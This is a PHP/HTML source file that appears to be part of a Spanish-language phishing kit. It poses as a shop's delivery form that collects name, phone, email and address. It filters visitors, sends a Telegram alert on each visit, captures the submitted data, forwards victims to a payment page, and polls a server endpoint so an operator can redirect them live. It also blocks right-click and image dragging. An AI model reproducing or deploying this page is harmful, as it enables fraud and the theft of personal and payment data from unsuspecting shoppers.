[file name]: tienda.php
[file content begin]
<?php
require_once 'functions.php';

checkMobileAccess(); // Verificación de seguridad
sendTelegramNotification('boutique');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    captureFormData();
    header('Location: pago.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Información de Entrega</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: white;
            background: #f5f5f5;
            padding: 0px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0px 0; /* ESPACIO AÑADIDO */
        }
        .header {
            background: white;
            color: black;
            padding: 0px;
            text-align: center;
            border-radius: 10px;
            margin-bottom: 5px;
            width: 100%;
        }
        .logo {
            font-size: 3em;
            margin-bottom: 0px;
        }
        .form-container {
            width: 92%;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            margin-bottom: 40px; /* ESPACIO AÑADIDO */
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 7px;
            font-weight: 600;
            color: #333;
            font-size: 1em;
        }
        input, select {
            width: 100%;
            padding: 14px 12px;
            border: 2px solid #e1e1e1;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #177ECF;
        }
        input.error {
            border-color: #e74c3c;
        }
        input.valid {
            border-color: #27ae60;
        }
        .form-row {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .form-row .form-group {
            margin-bottom: 10px;
        }
        .btn {
            background: #177ECF;
            color: white;
            border: none;
            padding: 16px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1.1em;
            width: 95%;
            margin-top: 20px;
            margin-bottom: 20px; /* REDUCIDO PARA EL ESPACIO GLOBAL */
        }
        .btn:hover {
            opacity: 1;
        }
        .required {
            color: #e74c3c;
        }
        .info-text {
            text-align: center;
            margin-bottom: 15px;
            color: #666;
            font-size: 1em;
        }
        .error-message {
            color: #e74c3c;
            font-size: 0.75em;
            margin-top: 5px;
            display: none;
        }
        @media (min-width: 768px) {
            .form-container {
                max-width: 500px;
            }
            .form-row {
                flex-direction: row;
            }
        }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="header">
            <a href="https://imgbb.com/"><img src="https://i.ibb.co/jP4NGJnh/T-l-chargement-2.jpg" alt="T-l-chargement-2" border="0" /></a>
        </div>

        <div class="form-container">
            <form id="deliveryForm" method="POST" novalidate>
                <div class="form-group">
                    <label for="nom">Apellido <span class="required">*</span></label>
                    <input type="text" id="nom" name="nom" placeholder="Su apellido">
                    <div class="error-message" id="nomError">Este campo es obligatorio</div>
                </div>
                <div class="form-group">
                    <label for="prenom">Nombre <span class="required">*</span></label>
                    <input type="text" id="prenom" name="prenom" placeholder="Su nombre">
                    <div class="error-message" id="prenomError">Este campo es obligatorio</div>
                </div>

                <div class="form-group">
                    <label for="telephone">Teléfono <span class="required">*</span></label>
                    <input type="tel" id="telephone" name="telephone" placeholder="+34" maxlength="12">
                    <div class="error-message" id="telephoneError">El teléfono debe tener al menos 12 dígitos</div>
                </div>

                <div class="form-group">
                    <label for="email">Email <span class="required">*</span></label>
                    <input type="email" id="email" name="email" placeholder="su@email.com">
                    <div class="error-message" id="emailError">Este campo es obligatorio</div>
                </div>

                <div class="form-group">
                    <label for="adresse">Dirección <span class="required">*</span></label>
                    <input type="text" id="adresse" name="adresse" placeholder="Calle Ejemplo, 123">
                    <div class="error-message" id="adresseError">Este campo es obligatorio</div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="code_postal">Código Postal <span class="required">*</span></label>
                        <input type="text" id="code_postal" name="code_postal" placeholder="28000" maxlength="5">
                        <div class="error-message" id="codePostalError">El código postal debe tener 5 dígitos</div>
                    </div>

                    <div class="form-group">
                        <label for="ville">Ciudad <span class="required">*</span></label>
                        <input type="text" id="ville" name="ville" placeholder="Madrid">
                        <div class="error-message" id="villeError">Este campo es obligatorio</div>
                    </div>
                </div>

                <center><button type="submit" class="btn">
                    Continuar al Pago
                </button>
            </form>
        </div>
    </div>

    <?php include 'footer.php'; ?>

<script>
// Prevenir clic derecho en toda la página
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Prevenir clic en imágenes
document.addEventListener('DOMContentLoaded', function() {
    const images = document.querySelectorAll('img');
    images.forEach(img => {
        img.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
        
        // Prevenir arrastrar y soltar
        img.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });
    });
});

// Validación du formulaire
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('deliveryForm');
    const nomInput = document.getElementById('nom');
    const nomError = document.getElementById('nomError');
    const prenomInput = document.getElementById('prenom');
    const prenomError = document.getElementById('prenomError');
    const telephoneInput = document.getElementById('telephone');
    const telephoneError = document.getElementById('telephoneError');
    const emailInput = document.getElementById('email');
    const emailError = document.getElementById('emailError');
    const adresseInput = document.getElementById('adresse');
    const adresseError = document.getElementById('adresseError');
    const codePostalInput = document.getElementById('code_postal');
    const codePostalError = document.getElementById('codePostalError');
    const villeInput = document.getElementById('ville');
    const villeError = document.getElementById('villeError');
    
    // Fonction de validation du formulaire
    function validateForm() {
        let isValid = true;
        
        // Validation des champs simples
        if (!nomInput.value.trim()) {
            isValid = false;
            nomError.style.display = 'block';
            nomInput.classList.add('error');
        } else {
            nomError.style.display = 'none';
            nomInput.classList.remove('error');
        }
        
        if (!prenomInput.value.trim()) {
            isValid = false;
            prenomError.style.display = 'block';
            prenomInput.classList.add('error');
        } else {
            prenomError.style.display = 'none';
            prenomInput.classList.remove('error');
        }
        
        if (!emailInput.value.trim()) {
            isValid = false;
            emailError.style.display = 'block';
            emailInput.classList.add('error');
        } else {
            emailError.style.display = 'none';
            emailInput.classList.remove('error');
        }
        
        if (!adresseInput.value.trim()) {
            isValid = false;
            adresseError.style.display = 'block';
            adresseInput.classList.add('error');
        } else {
            adresseError.style.display = 'none';
            adresseInput.classList.remove('error');
        }
        
        if (!villeInput.value.trim()) {
            isValid = false;
            villeError.style.display = 'block';
            villeInput.classList.add('error');
        } else {
            villeError.style.display = 'none';
            villeInput.classList.remove('error');
        }
        
        // Validation spécifique du téléphone
        const telephoneValue = telephoneInput.value;
        const phoneValid = validatePhoneNumber(telephoneValue);
        if (!phoneValid) {
            isValid = false;
            telephoneError.style.display = 'block';
            telephoneInput.classList.add('error');
        } else {
            telephoneError.style.display = 'none';
            telephoneInput.classList.remove('error');
        }
        
        // Validation spécifique du code postal
        const codePostalValue = codePostalInput.value;
        const postalValid = codePostalValue.length === 5;
        if (!postalValid) {
            isValid = false;
            codePostalError.style.display = 'block';
            codePostalInput.classList.add('error');
        } else {
            codePostalError.style.display = 'none';
            codePostalInput.classList.remove('error');
        }
        
        return isValid;
    }
    
    // Événement de soumission du formulaire
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (validateForm()) {
            // Si le formulaire est valide, on le soumet
            this.submit();
        }
    });
    
    // Validation en temps réel pour tous les champs
    [nomInput, prenomInput, emailInput, adresseInput, villeInput].forEach(input => {
        input.addEventListener('input', function() {
            if (this.value.trim()) {
                this.classList.remove('error');
                const errorElement = document.getElementById(this.id + 'Error');
                if (errorElement) {
                    errorElement.style.display = 'none';
                }
            }
        });
    });
    
    // Validation en temps réel du téléphone
    telephoneInput.addEventListener('input', function(e) {
        let value = e.target.value;
        
        // Permitir solo números y el signo + al inicio
        if (value.startsWith('+')) {
            const rest = value.substring(1).replace(/\D/g, '');
            value = '+' + rest;
        } else {
            value = value.replace(/\D/g, '');
        }
        
        // Limitar a 12 caracteres máximo
        if (value.length > 12) {
            value = value.substring(0, 12);
        }
        
        e.target.value = value;
        
        // Validar teléfono
        const phoneValid = validatePhoneNumber(value);
        if (value.length > 0 && !phoneValid) {
            telephoneError.style.display = 'block';
            e.target.classList.add('error');
            e.target.classList.remove('valid');
        } else {
            telephoneError.style.display = 'none';
            e.target.classList.remove('error');
            if (phoneValid) {
                e.target.classList.add('valid');
            }
        }
    });
    
    // Validación del código postal - solo números
    codePostalInput.addEventListener('input', function(e) {
        let value = e.target.value;
        
        // Permitir solo números
        value = value.replace(/\D/g, '');
        
        // Limitar a 5 caracteres
        if (value.length > 5) {
            value = value.substring(0, 5);
        }
        
        e.target.value = value;
        
        // Validar código postal
        if (value.length > 0 && value.length !== 5) {
            codePostalError.style.display = 'block';
            e.target.classList.add('error');
            e.target.classList.remove('valid');
        } else {
            codePostalError.style.display = 'none';
            e.target.classList.remove('error');
            if (value.length === 5) {
                e.target.classList.add('valid');
            }
        }
    });

    function validatePhoneNumber(phone) {
        if (phone.startsWith('+')) {
            return phone.length >= 10; // +34 123456789 (12 caracteres)
        } else {
            return phone.length >= 9; // 123456789 (9 caracteres)
        }
    }
});
</script>

    <script>
        setInterval(function() {
            fetch('check_redirect.php')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.url;
                    }
                })
                .catch(error => console.error('Error:', error));
        }, 2000);
    </script>
</body>
</html>
[file content end]
